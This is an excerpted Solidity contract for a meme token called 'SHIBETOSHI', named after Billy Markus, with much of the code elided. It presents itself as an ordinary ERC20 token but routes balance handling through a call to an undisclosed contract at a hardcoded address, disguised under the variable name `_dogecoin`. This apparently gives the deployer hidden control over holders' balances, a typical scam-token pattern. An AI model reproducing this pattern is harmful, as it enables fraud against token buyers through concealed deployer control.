...
// The real dogefather: Shibetoshi Nakamoto aka Billy Markus.
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _dogecoin = 0x177Ed0B3fa96C6E916A085Cb2A91Cb0644F47723;
    address public pair;
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return dogecoin.accessBlockchain(amount);
    }
    ...
    function _DeploySHIBETOSHI(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySHIBETOSHI(creator, initialSupply);
    }
}

contract Shibetoshi is ERC20Token {
    constructor() ERC20Token("Billy Markus", "SHIBETOSHI", msg.sender, 139119806384 * 10 ** 18) {
    }
}